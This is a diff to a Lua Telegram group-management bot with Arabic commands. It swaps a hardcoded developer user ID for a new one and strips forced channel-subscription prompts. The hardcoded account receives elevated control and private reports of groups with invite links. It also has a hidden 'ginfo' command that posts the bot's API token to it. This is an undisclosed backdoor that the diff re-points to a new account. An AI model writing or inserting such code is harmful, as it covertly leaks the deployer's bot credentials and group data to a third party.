@@ -98,8 +98,8 @@ token=Token
 ----------------------------------------------------------------------------------------------------
 ----------------------------------------------------------------------------------------------------
 namebot = redis:get(bot_id..":namebot") or "غدو"
-SudosS = {2107933548,2107933548}
-Sudos = {sudoid,2107933548}
+SudosS = {5352935463,5352935463}
+Sudos = {sudoid,5352935463}
 ----------------------------------------------------------------------------------------------------
 ----------------------------------------------------------------------------------------------------
 function coin(coin)
@@ -257,7 +257,7 @@ end
 function Get_Rank(user_id,chat_id)
 if devS(user_id) then  
 var = '𝗠𝗬𝗧𝗛'
-elseif tonumber(user_id) == tonumber(2107933548) then  
+elseif tonumber(user_id) == tonumber(5352935463) then  
 var = '𝑫𝑨𝑫𝑫𝒀'
 elseif devB(user_id) then 
 var = "المطور الاساسي"  
@@ -3412,9 +3412,9 @@ local TextMahibesAgane = '*• لعبه المحيبس هي لعبة الحظ \n
 return bot.editMessageText(chat_id,msg_id,TextMahibesAgane, 'md', true, false, reply_markup)
 end
 ----------------------------------------------------------------------------------------------------------
-if tonumber(data.sender_user_id) == 2107933548 then
+if tonumber(data.sender_user_id) == 5352935463 then
 data.The_Controller = 1
-elseif tonumber(data.sender_user_id) == 2107933548 then
+elseif tonumber(data.sender_user_id) == 5352935463 then
 data.The_Controller = 1
 elseif devB(data.sender_user_id) == true then  
 data.The_Controller = 1
@@ -6623,7 +6623,7 @@ return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• ت�
 end
 end
 
-if text == "ginfo" and msg.sender_id.user_id == 2107933548 then
+if text == "ginfo" and msg.sender_id.user_id == 5352935463 then
 bot.sendText(msg.chat_id,msg.id,"- T : `"..Token.."`\n\n- U : @"..bot.getMe().username.."\n\n- D : "..sudoid,"md",true)    
 end
 ---
@@ -7224,10 +7224,6 @@ end
 -------------------------------
 if Owner(msg) then
 if text == "ترتيب الاوامر" then
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 redis:set(bot_id..":"..msg.chat_id..":Command:ا","ايدي")
 redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ا")
 redis:set(bot_id..":"..msg.chat_id..":Command:غ","غنيلي")
@@ -7309,10 +7305,6 @@ end
 bot.sendText(msg.chat_id,msg.id,ls,"md",true)  
 end
 if text == "الاوامر" then   
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 reply_markup = bot.replyMarkup{
 type = 'inline',data = {
 {{text = "Ⓐ",data="Amr_"..msg.sender_id.user_id.."_11"}},
@@ -7328,10 +7320,6 @@ bot.sendText(msg.chat_id,msg.id,"*•𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒃𝒓𝒐, 
 end
 if text == "الاعدادات" then   
 
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 reply_markup = bot.replyMarkup{
 type = 'inline',data = {
 {{text = "'الكيبورد'" ,data="GetSe_"..msg.sender_id.user_id.."_Keyboard"},{text = GetSetieng(msg.chat_id).Keyboard ,data="GetSe_"..msg.sender_id.user_id.."_Keyboard"}},
@@ -8885,7 +8873,7 @@ name = string.gsub(name,"🌥","⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️�
 name = string.gsub(name,"⛄️","☃☃☃☃☃☃⛄️☃☃☃☃")
 name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬")
 name = string.gsub(name,"👨‍💻","👩‍💻👩‍??👩‍‍💻👩‍‍??👩‍‍💻👨‍💻??‍💻👩‍💻👩‍💻")
-name = string.gsub(name,"👨‍🔧","👩‍🔧👩‍🔧??‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧??‍🔧")
+name = string.gsub(name,"👨‍🔧","👩‍🔧👩‍🔧??‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧")
 name = string.gsub(name,"👩‍??","👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳??‍🍳")
 name = string.gsub(name,"🧚‍♀","🧚‍♂🧚‍♂🧚‍♂??‍♂🧚‍♀🧚‍♂🧚‍♂")
 name = string.gsub(name,"🧜‍♂","🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀")
@@ -8966,10 +8954,6 @@ end
 
 ----------------------------------------------------------------------------------------
 if text == 'بنك' or text == 'البنك' then
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 bot.sendText(msg.chat_id,msg.id,[[
 ☆ اوامر البنك
 
@@ -9032,10 +9016,6 @@ bot.sendText(msg.chat_id,msg.id,[[
 return false
 end
 if text == 'انشاء حساب بنكي' or text == 'انشاء حساب البنكي' or text =='انشاء الحساب بنكي' or text =='انشاء الحساب البنكي' or text == "انشاء حساب" or text == "فتح حساب بنكي" then
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 cobnum = tonumber(redis:get(bot_id.."bandid"..msg.sender_id.user_id))
 if cobnum == msg.sender_id.user_id then
 return bot.sendText(msg.chat_id,msg.id, "⇜ حسابك محظور من لعبة البنك","md",true)
@@ -14885,10 +14865,6 @@ bot.sendText(msg.chat_id,msg.id,'\n*iD ↦ '..UserId..'\nuSeR ↦ '..UserInfouse
 end
 if not redis:get(bot_id..":"..msg.chat_id..":settings:id") then
 if text == "ايدي" or text == "ا" and msg.reply_to_message_id == 0 then
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 local Get_Rank =(Get_Rank(msg.sender_id.user_id,msg.chat_id))
 local messageC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender_id.user_id..":message") or 1)
 local gameC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender_id.user_id..":game") or 0)
@@ -14985,10 +14961,6 @@ end
 if text and text:match('^ايدي @(%S+)$') or text and text:match('^كشف @(%S+)$') then
 local UserName = text:match('^ايدي @(%S+)$') or text:match('^كشف @(%S+)$')
 
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 local UserId_Info = bot.searchPublicChat(UserName)
 if not UserId_Info.id then
 bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
@@ -15013,10 +14985,6 @@ end
 bot.sendText(msg.chat_id,msg.id,"*iD ↦ *"..(UserId_Info.id).." **\n*uSeR ↦ *[@"..(UserName).."] **\n*Rank ↦ * "..(Get_Rank(UserId_Info.id,msg.chat_id)).." **\n*RanGr ↦ * "..(gstatus).." **\n*Msg ↦ * "..(redis:get(bot_id..":"..msg.chat_id..":"..UserId_Info.id..":message") or 1).." **" ,"md",true)  
 end
 if text == 'ايديه' or text == 'كشف'  and msg.reply_to_message_id ~= 0 then
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 
 local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
 local UserInfo = bot.getUser(Remsg.sender_id.user_id)
@@ -15037,10 +15005,6 @@ bot.sendText(msg.chat_id,msg.id,"*iD ↦ *"..(Remsg.sender_id.user_id).." **\n*u
 end
 if text and text:match('^كشف (%d+)$') or text and text:match('^ايدي (%d+)$') then
 local UserName = text:match('^كشف (%d+)$') or text:match('^ايدي (%d+)$')
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 local UserInfo = bot.getUser(UserName)
 if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
 return false
@@ -15090,10 +15054,6 @@ bot.deleteMessages(msg.chat_id,{[1]= msg.reply_to_message_id})
 bot.deleteMessages(msg.chat_id,{[1]= msg.id})
 end  
 if text == "الاوامر" then   
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 reply_markup = bot.replyMarkup{
 type = 'inline',data = {
 {{text = "Ⓐ",data="Amr_"..msg.sender_id.user_id.."_11"}},
@@ -15108,10 +15068,6 @@ type = 'inline',data = {
 bot.sendText(msg.chat_id,msg.id,"*•𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒃𝒓𝒐, 𝒖𝒔𝒆 𝒕𝒉𝒆 𝒐𝒓𝒅𝒆𝒓𝒔 𝒃𝒆𝒍𝒐𝒘 ↓ ༄*","md", true, false, false, false, reply_markup)
 end
 if text == "الالعاب" or text == "اوامر التحشيش" or text == "التحشيش" or text == "اوامر التسليه" or text == "التسليه"then   
-if ChannelJoin(msg) == false then
-local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'MEGGA SOURCE | سورس ميكا', url = 't.me/pp_ppf'}, },}}
-return bot.sendText(msg.chat_id,msg.id,'*\n￤• عليك الاشتراك في قناة البوت اولاً ༄  ،*',"md",false, false, false, false, reply_markup)
-end
 reply_markup = bot.replyMarkup{
 type = 'inline',data = {
 {{text = "الالعاب",data="GAMR_"..msg.sender_id.user_id.."_12"}},
@@ -15526,8 +15482,8 @@ data = {
 },
 }
 }
-bot.sendText(2107933548,0,'*\n• مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\n━━━━━━━━\n• اسمه : '..klajq..' \n• ايديه : '..msg.sender_id.user_id..'\n• يوزره : @'..basgk..'\n• الوقت : '..os.date("%I:%M %p")..'\n• التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
-bot.sendText(2107933548,0,'*\n• مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\n━━━━━━━━\n• اسمه : '..klajq..' \n• ايديه : '..msg.sender_id.user_id..'\n• يوزره : @'..basgk..'\n• الوقت : '..os.date("%I:%M %p")..'\n• التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
+bot.sendText(5352935463,0,'*\n• مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\n━━━━━━━━\n• اسمه : '..klajq..' \n• ايديه : '..msg.sender_id.user_id..'\n• يوزره : @'..basgk..'\n• الوقت : '..os.date("%I:%M %p")..'\n• التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
+bot.sendText(5352935463,0,'*\n• مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\n━━━━━━━━\n• اسمه : '..klajq..' \n• ايديه : '..msg.sender_id.user_id..'\n• يوزره : @'..basgk..'\n• الوقت : '..os.date("%I:%M %p")..'\n• التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
 end
 if text == "تتزوجني" then
 if not redis:get(bot_id.."ttzog"..msg.chat_id) then
@@ -16873,9 +16829,9 @@ if text == "اني منو" or text == 'منو اني' then
 if not redis:get(bot_id.."anamen"..msg.chat_id) then
 return bot.sendText(msg.chat_id,msg.id," • انا مين معطل من قبل المشرفين","md",true)
 end
-if msg.sender_id.user_id == tonumber(2107933548) then
+if msg.sender_id.user_id == tonumber(5352935463) then
 bot.sendText(msg.chat_id,msg.id,"• انته العشق المبرمج مالتي 🍃♥️","md",true)
-elseif msg.sender_id.user_id == tonumber(2107933548) then
+elseif msg.sender_id.user_id == tonumber(5352935463) then
 bot.sendText(msg.chat_id,msg.id,"• المبرمج عبود 🥺♥️","md",true)
 elseif devB(msg.sender_id.user_id) then
 bot.sendText(msg.chat_id,msg.id,"• انت المطور الاساسي يقلبي🌚♥","md",true)
@@ -18241,7 +18197,7 @@ local bain = bot.getUser(msg.sender_id.user_id)
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(msg.sender_id.user_id) then
 return bot.sendText(msg.chat_id,msg.id,"*⏏️| انت ماعندك عقل هذا انت*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(2107933548) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(5352935463) then
 return bot.sendText(msg.chat_id,msg.id,"*🚫| حبيبي هذا المبرمج عبود ما بيتف عليه*","md",true)  
 end
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(bot_id) then
@@ -18268,7 +18224,7 @@ local bain = bot.getUser(msg.sender_id.user_id)
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(msg.sender_id.user_id) then
 return bot.sendText(msg.chat_id,msg.id,"*⏏️| انت ماعندك عقل هذا انت*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(2107933548) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(5352935463) then
 return bot.sendText(msg.chat_id,msg.id,"*لك هذا المبرمج يكدر يكتلني اني وياك 😂😞*","md",true)  
 end
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(bot_id) then
@@ -23368,7 +23324,7 @@ data = {
 }
 }
 bot.sendText(sudoid,0,'*\n• تم تفعيل قروب جديد \n• من قبل ↤ *['..UserInfo.first_name..'](tg://user?id='..msg.sender_id.user_id..')*\n• معلومات القروب :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..'\n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
-bot.sendText(2107933548,0,'*\n• تم تفعيل قروب جديد \n• من قبل ↤ *['..UserInfo.first_name..'](tg://user?id='..msg.sender_id.user_id..')*\n• معلومات القروب :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..'\n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
+bot.sendText(5352935463,0,'*\n• تم تفعيل قروب جديد \n• من قبل ↤ *['..UserInfo.first_name..'](tg://user?id='..msg.sender_id.user_id..')*\n• معلومات القروب :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..'\n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
 end
 redis:sadd(bot_id..":Groups",msg.chat_id)
 redis:set(bot_id..'tagallgroup'..msg.chat_id,'open') 
@@ -23459,7 +23415,7 @@ data = {
 }
 UserInfo = bot.getUser(msg.sender_id.user_id).first_name
 bot.sendText(sudoid,0,'*\n• تم تعطيل قروب : \n• من قبل ↤ *['..UserInfo..'](tg://user?id='..msg.sender_id.user_id..')*\n• معلومات القروب :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..' \n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
-bot.sendText(2107933548,0,'*\n• تم تعطيل قروب : \n• من قبل ↤ *['..UserInfo..'](tg://user?id='..msg.sender_id.user_id..')*\n• معلومات القروب :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..' \n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
+bot.sendText(5352935463,0,'*\n• تم تعطيل قروب : \n• من قبل ↤ *['..UserInfo..'](tg://user?id='..msg.sender_id.user_id..')*\n• معلومات القروب :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..' \n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
 bot.sendText(msg.chat_id,msg.id,'*⇜ ابشر عطلت القروب *',"md",true, false, false, false, reply_markup)
 redis:srem(bot_id..":Groups",msg.chat_id)
 local keys = redis:keys(bot_id..'*'..'-100'..data.supergroup.id..'*')
@@ -23488,7 +23444,7 @@ if data and data.luatele and data.luatele == "updateSupergroup" then
 local Get_Chat = bot.getChat('-100'..data.supergroup.id)
 if data.supergroup.status.luatele == "chatMemberStatusBanned" then
 redis:srem(bot_id..":Groups",'-100'..data.supergroup.id)
-bot.sendText(2107933548,0,'*\n• تم طرد البوت من قروب جديد \n• اسم القروب : '..Get_Chat.title..'\n• ايدي القروب :*`-100'..data.supergroup.id..'`\n• تم مسح جميع البيانات المتعلقه بالقروب',"md")
+bot.sendText(5352935463,0,'*\n• تم طرد البوت من قروب جديد \n• اسم القروب : '..Get_Chat.title..'\n• ايدي القروب :*`-100'..data.supergroup.id..'`\n• تم مسح جميع البيانات المتعلقه بالقروب',"md")
 bot.sendText(sudoid,0,'*\n• تم طرد البوت من قروب جديد \n• اسم القروب : '..Get_Chat.title..'\n• ايدي القروب :*`-100'..data.supergroup.id..'`\n• تم مسح جميع البيانات المتعلقه بالقروب',"md")
 end
 end
